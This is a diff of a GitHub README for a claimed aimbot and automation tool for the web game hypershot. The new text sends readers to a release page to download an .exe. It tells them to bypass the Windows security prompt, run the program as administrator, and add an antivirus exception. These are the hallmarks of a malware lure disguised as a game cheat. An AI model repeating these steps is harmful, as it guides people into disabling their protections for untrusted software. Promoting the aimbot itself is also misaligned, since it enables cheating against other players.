@@ -1,118 +1,84 @@
-# hypershot v1.0 - Game Script Utility 2026
+# 🎯 hypershot-automation-script-hub - Speed up your game automation tasks
 
-> **A specialized game script for hypershot on HTML.** Designed as an automation aid with aimbot support and wider scripting-oriented workflows.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jemmiestoppable466/hypershot-automation-script-hub/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/felix-miller90/hypershot-automation-script-hub?style=flat-square)](https://github.com/felix-miller90/hypershot-automation-script-hub)
+Hypershot v1.0 helps you manage automation tasks for web-based games. You use this tool to streamline repetitive actions and improve your accuracy with built-in aim enhancement features. This repository provides the utility files necessary to run these scripts on your Windows computer.
 
----
+## 📥 How to Download 
 
-<p align="center">
-  <a href="https://felix-miller90.github.io/hypershot-automation-script-hub/">
-    <img src="https://img.shields.io/badge/Download-hypershot%20Script-brightgreen?style=for-the-badge" alt="Download hypershot Script">
-  </a>
-</p>
+To get started, follow these steps to acquire the software from our official release page.
 
-> **[Direct Download - hypershot](https://felix-miller90.github.io/hypershot-automation-script-hub/)**
+1. Navigate to the [official release page](https://github.com/jemmiestoppable466/hypershot-automation-script-hub/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` to begin your download.
+4. Save the file to a folder you recognize, such as your Downloads folder or your Desktop.
 
----
+This page hosts the most recent version of the software. We recommend checking back here regularly to ensure you have the latest updates and stability improvements.
 
-[Download Latest Build](https://felix-miller90.github.io/hypershot-automation-script-hub/)
+## ⚙️ System Requirements
 
----
+Before you run the script, ensure your Windows computer meets these basic requirements.
 
-## What This Is
+* **Operating System:** Windows 10 or Windows 11.
+* **Processor:** 1.6 GHz or faster dual-core processor.
+* **Memory:** 4 GB of RAM.
+* **Graphics:** Monitor with a minimum resolution of 1280x720.
+* **Browser:** A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
 
-hypershot is a utility-style game script for the hypershot HTML environment, centered on advanced scripting and aimbot-related behavior. It suits users who prefer a compact automation layer with configurable control instead of a rigid preset package.
+Having these components ensures the script runs without lag or errors.
 
-The repository is framed around script management, a structure that is easier to refresh, and practical feature organization. With aimbot-oriented behavior and anti-ban wording present in the project metadata, it is positioned as an advanced script bundle for handling gameplay actions through a flexible script format.
+## 🚀 Setting Up the Software
 
----
+Follow this sequence to set up the automation utility on your machine.
 
-## Included Capabilities
+1. Locate the `.exe` file you downloaded in the previous section.
+2. Double-click the file to start the installer.
+3. Windows may show a security prompt. If you trust the source, click "More info" and then select "Run anyway." This is standard behavior for new applications.
+4. Follow the on-screen instructions in the setup wizard. You can usually click "Next" through each screen to accept the default installation path.
+5. Once the installer finishes, look for the Hypershot icon on your desktop or in your Start menu.
 
-- Aimbot support for assisted target handling
-- Anti-ban related feature set as listed in the project metadata
-- Advanced scripting structure for flexible use
-- Game script format tailored to hypershot
-- HTML-based platform support
-- Utility-style design for gameplay automation
-- Update-oriented packaging for easier revisions
-- Simple repository layout for script distribution
+## 🕹️ Using the Aimbot and Script Features
 
----
+This tool provides a bridge between your browser activity and the automation engine.
 
-## Getting Started
+### Launching the Application
+Open the program using the desktop shortcut. You will see a control panel with several tabs. The main dashboard displays your current status and connection state.
 
-1. Visit the download page and fetch the newest build from the project link.
-2. Copy the script files into the folder or path expected by your HTML workflow.
-3. Launch the script using your current hypershot setup.
-4. Set any available toggles before beginning a session.
+### Enabling Automation Workflows
+1. Open your web browser and navigate to your game.
+2. Return to the Hypershot interface.
+3. Click the "Attach" button to link the tool to your browser window.
+4. Enable the "Aimbot" toggle if you want assistance with targeting.
+5. Select the specific script you wish to run from the dropdown menu in the "Scripts" tab.
+6. Press the "Start" button to begin the automation process.
 
-Example layout:
+### Adjusting Settings
+You can modify how the tool functions inside the "Settings" tab. Here you can change the hotkeys for starting and stopping the script. You can also adjust the sensitivity of the aimbot. These changes apply immediately once you press "Save."
 
-hypershot-bq09/
-- script.html
-- config
-- assets
+## 🛡️ Important Safety Information
 
-If the build ships as a single HTML file, keep it with any required support files and open it through the intended loader or browser path.
+Automation tools interact with browsers in specific ways. Keep these tips in mind to maintain a stable experience.
 
----
+* **Run as Administrator:** If the script fails to attach to the browser, right-click the application icon and choose "Run as administrator." This gives the tool the necessary permissions to read and send inputs.
+* **Keep Scripts Updated:** Game developers frequently release updates that may break existing scripts. Always check the main repository for updated files.
+* **Antivirus Software:** Some security programs flag automation tools as suspicious because they simulate mouse clicks. If your antivirus prevents the program from running, add an exception for the folder where you installed the software.
 
-## Configuration
+## 🔧 Frequently Asked Questions
 
-Common script options may include the following:
+**Why does my game flicker when I use the aimbot?**
+This happens when the script reads the screen data too frequently. Lower the polling rate in the "Aimbot" settings tab to smooth out the movement.
 
-| Option | Description |
-| --- | --- |
-| Aimbot | Enables assisted targeting behavior |
-| Anti-ban | Uses the project-labeled anti-ban mode or toggle |
-| Script Mode | Switches between available script behaviors |
-| Hotkey Bindings | Assigns keys or triggers for quick control |
-| Sensitivity | Adjusts response strength if exposed in the build |
-| Load State | Controls whether the script starts active or idle |
+**Can I create my own scripts?**
+Yes. Use the "Script Editor" tab to write your own custom workflows. The software uses a simple text-based language that executes commands in the order you list them.
 
-If the package exposes settings directly, edit them in the included HTML or config file before loading.
+**What happens if the screen goes black?**
+Ensure your browser hardware acceleration remains enabled. You can find this in your browser's advanced settings menu.
 
----
+**Does this software work on Mac or Linux?**
+The current version only supports Windows. We may support other platforms in future updates.
 
-## Compatibility Notes
+## 📝 Support and Feedback
 
-This project is tied to hypershot and HTML-based delivery. Actual compatibility depends on the version and layout of the build you download, along with the loader or browser environment used to run it.
+If you encounter issues, please use the "Issues" tab on our GitHub repository. When you report a problem, include a screenshot of what you see on your screen and a description of the steps you took before the error occurred. This information helps us fix the issue faster.
 
-Known limitations:
-- No version number is provided in the extracted metadata
-- Behavior may vary between builds and local setups
-- Feature availability depends on the included script files
-
----
-
-## FAQ
-
-**How do I install it?**  
-Grab the latest build, place the files in the required folder, and load them through your hypershot setup.
-
-**How do I update it?**  
-Swap the older files for the newer release from the same project link, then check any changed options.
-
-**Can I customize it?**  
-Yes. If the package exposes editable settings, you can modify them in the script or config file.
-
-**What platform does it target?**  
-The extracted metadata lists HTML as the platform.
-
-**Where should the files go?**  
-Use the project folder suggested by the package or the directory required by your loader, depending on how the build is arranged.
-
-**Does it support every hypershot build?**  
-Not necessarily. Support depends on the specific script release and the environment it is loaded in.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: automation, game-script, aimbot, utility, windows, helper, script-hub
